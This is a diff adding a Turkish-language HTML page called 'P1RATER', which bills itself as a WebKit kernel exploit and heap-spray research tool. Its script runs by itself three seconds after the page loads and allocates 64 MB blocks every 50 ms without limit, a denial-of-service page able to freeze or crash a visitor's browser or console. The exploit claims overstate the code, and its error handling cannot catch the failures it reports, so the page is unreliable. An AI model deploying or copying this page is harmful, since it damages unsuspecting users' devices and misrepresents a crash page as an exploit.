@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>P1RATER - Research Lab V1.0</title>
+    <style>
+        body {
+            background-color: #050505;
+            color: #00ff00;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        #box {
+            border: 2px solid #00ff00;
+            padding: 20px;
+            background: rgba(0, 255, 0, 0.05);
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
+        }
+        .warning { color: #ff0000; font-weight: bold; animation: blink 1s infinite; }
+        @keyframes blink { 50% { opacity: 0; } }
+        #logs {
+            margin-top: 20px;
+            font-size: 12px;
+            text-align: left;
+            width: 80%;
+            max-height: 200px;
+            overflow-y: auto;
+            border-top: 1px solid #333;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="box">
+        <h1>P1RATER PROJECT v1.0</h1>
+        <p class="warning">DİKKAT: BELLEK SIÇRATMA TESTİ AKTİF</p>
+        <p>Sistem Durumu: <span id="status">BEKLENİYOR...</span></p>
+        <p>Enjekte Edilen Veri: <span id="counter">0</span> MB</p>
+    </div>
+
+    <div id="logs">
+        [SYSTEM] P1rater Kernel Exploit Research Tool başlatıldı...<br>
+        [SYSTEM] Hedef: WebKit / Browser Memory Management...<br>
+    </div>
+
+    <script>
+        const statusEl = document.getElementById('status');
+        const counterEl = document.getElementById('counter');
+        const logsEl = document.getElementById('logs');
+
+        function log(msg) {
+            const div = document.createElement('div');
+            div.innerText = `[LOG] ${new Date().toLocaleTimeString()}: ${msg}`;
+            logsEl.prepend(div);
+        }
+
+        // RAM Sıçratma (Heap Spraying) Motoru
+        async function initiateP1raterExploit() {
+            log("Bellek haritalama başlıyor...");
+            statusEl.innerText = "SIÇRATILIYOR...";
+            
+            let memoryHog = [];
+            let totalMB = 0;
+
+            // İşlemciyi meşgul etmek için arka plan işçisi
+            try {
+                setInterval(() => {
+                    // Her döngüde 64MB'lık devasa bloklar oluştur
+                    // 0x46465543 = ASCII "FFUC"
+                    let buffer = new Uint32Array(1024 * 1024 * 16); 
+                    buffer.fill(0x46465543); 
+                    memoryHog.push(buffer);
+                    
+                    totalMB += 64;
+                    counterEl.innerText = totalMB;
+
+                    if (totalMB % 256 === 0) {
+                        log(`${totalMB} MB belleğe yazıldı, sınır zorlanıyor...`);
+                    }
+                }, 50); // 50ms hızla RAM'e saldır
+            } catch (err) {
+                log("KRİTİK HATA: Bellek Doldu! Sıçrama gerçekleşiyor olabilir.");
+                statusEl.innerText = "SIÇRAMA TETİKLENDİ!";
+                statusEl.style.color = "yellow";
+            }
+        }
+
+        // Xbox açılışındaki siyah ekranı simüle etmek için 3 saniye bekle ve başla
+        setTimeout(() => {
+            initiateP1raterExploit();
+        }, 3000);
+    </script>
+</body>
+</html>
